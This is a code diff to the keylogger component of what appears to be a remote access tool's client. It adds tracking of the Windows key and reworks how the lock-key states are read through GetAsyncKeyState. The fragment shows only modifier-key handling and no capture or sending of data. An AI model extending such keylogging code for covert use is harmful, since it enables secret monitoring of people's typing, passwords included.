@@ -20,10 +20,10 @@ namespace xClient.Core.Keylogger
         public bool ShiftKeyPressed { get; set; }
         public bool AltKeyPressed { get; set; }
         public bool CtrlKeyPressed { get; set; }
-
         public bool CapsLock { get; set; }
         public bool NumLock { get; set; }
         public bool ScrollLock { get; set; }
+        public bool WindowsKeyPressed { get; set; }
     }
 
     /// <summary>
@@ -36,10 +36,12 @@ namespace xClient.Core.Keylogger
         /// Gets the key that was pressed.
         /// </summary>
         public KeyloggerKeys PressedKey { get; set; }
+
         /// <summary>
         /// An object with the purpose of storing the states of modifier keys.
         /// </summary>
         public KeyloggerModifierKeys ModifierKeys { get; private set; }
+
         /// <summary>
         /// Determines if one of the modifier keys (excluding shift and caps
         /// lock) has been set.
@@ -56,27 +58,21 @@ namespace xClient.Core.Keylogger
             {
                 // Modifier keys that are pressed:
                 CtrlKeyPressed = Win32.GetAsyncKeyState(KeyloggerKeys.VK_CONTROL).IsKeyPressed(),
-                    //Win32.GetAsyncKeyState(KeyloggerKeys.VK_CONTROL).IsKeyPressed() ||
-                    //Win32.GetAsyncKeyState(KeyloggerKeys.VK_LCONTROL).IsKeyPressed() ||
-                    //Win32.GetAsyncKeyState(KeyloggerKeys.VK_RCONTROL).IsKeyPressed(),
                 AltKeyPressed = Win32.GetAsyncKeyState(KeyloggerKeys.VK_MENU).IsKeyPressed(),
-                    //Win32.GetAsyncKeyState(KeyloggerKeys.VK_MENU).IsKeyPressed() ||
-                    //Win32.GetAsyncKeyState(KeyloggerKeys.VK_LMENU).IsKeyPressed() ||
-                    //Win32.GetAsyncKeyState(KeyloggerKeys.VK_RMENU).IsKeyPressed(),
                 ShiftKeyPressed = Win32.GetAsyncKeyState(KeyloggerKeys.VK_SHIFT).IsKeyPressed(),
-                    //Win32.GetAsyncKeyState(KeyloggerKeys.VK_SHIFT).IsKeyPressed() ||
-                    //Win32.GetAsyncKeyState(KeyloggerKeys.VK_LSHIFT).IsKeyPressed() ||
-                    //Win32.GetAsyncKeyState(KeyloggerKeys.VK_RSHIFT).IsKeyPressed(),
                 // Modifier keys that have a state (toggle 'on' or 'off').
-                CapsLock = KeyloggerHelpers.CapsLockToggled(),
-                NumLock = KeyloggerHelpers.NumLockToggled(),
-                ScrollLock = KeyloggerHelpers.ScrollLockToggled()
+                CapsLock = Win32.GetAsyncKeyState(KeyloggerKeys.VK_CAPITAL).IsKeyToggled(),
+                NumLock = Win32.GetAsyncKeyState(KeyloggerKeys.VK_NUMLOCK).IsKeyToggled(),
+                ScrollLock = Win32.GetAsyncKeyState(KeyloggerKeys.VK_SCROLL).IsKeyToggled(),
+                WindowsKeyPressed = 
+                    Win32.GetAsyncKeyState(KeyloggerKeys.VK_LWIN).IsKeyToggled() ||
+                    Win32.GetAsyncKeyState(KeyloggerKeys.VK_RWIN).IsKeyToggled()
             };
 
             // To avoid having to repeatedly check if one of the modifier
             // keys (besides shift and caps lock) was set, just simply
             // decide and then store it right here.
-            ModifierKeysSet = (ModifierKeys.CtrlKeyPressed || ModifierKeys.AltKeyPressed);
+            ModifierKeysSet = (ModifierKeys.CtrlKeyPressed || ModifierKeys.AltKeyPressed || ModifierKeys.WindowsKeyPressed);
         }
     }
 
